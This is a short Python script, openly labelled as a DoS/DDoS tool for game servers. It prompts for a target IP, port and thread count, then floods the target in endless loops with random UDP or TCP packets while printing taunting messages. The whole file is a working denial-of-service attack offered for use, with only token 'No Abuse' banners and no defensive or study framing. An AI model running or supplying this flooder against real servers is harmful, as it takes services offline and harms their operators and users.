import random

import socket

import threading



print       (" - - > Spagethey / Yal!! < - - ")

print       (" - - > DoS/Ddos Samp Server < - - ")

print       (" - - > Don't Abuse Kids <- - ")                                   

print       (" - - > Rename? Sure !! < - - ")

print       (" - - > No Abuse  < - - ")

print       (" - - > Abuse delete Tools!! < - - ")

print       (" - - >  How Are You Ready?  < - - ")

    

ip = str(input("  Type Ip:"))

port = int(input(" Port:"))

choice = str(input(" Spagethey Cool? (y/n):"))

times = int(input(" how much is the package?:"))

threads = int(input(" How much is in it?:"))

def run():

	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			addr = (str(ip),int(port))

			for x in range(times):

				s.sendto(data,addr)

			print(i +" Mampus Dek!!! ")

		except:

			print("[!] System Down!!!")



def run2():

	data = random._urandom(16)

	i = random.choice(("[*]","[!]","[#]"))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			s.connect((ip,port))

			s.send(data)

			for x in range(times):

				s.send(data)

			print(i +" Easy Kali Men Haha!!! ")

		except:

			s.close()

			print("[*] System Down !!!")

            

for y in range(threads):

	if choice == 'y':

		th = threading.Thread(target = run)

		th.start()

	else:

		th = threading.Thread(target = run2)

		th.start()
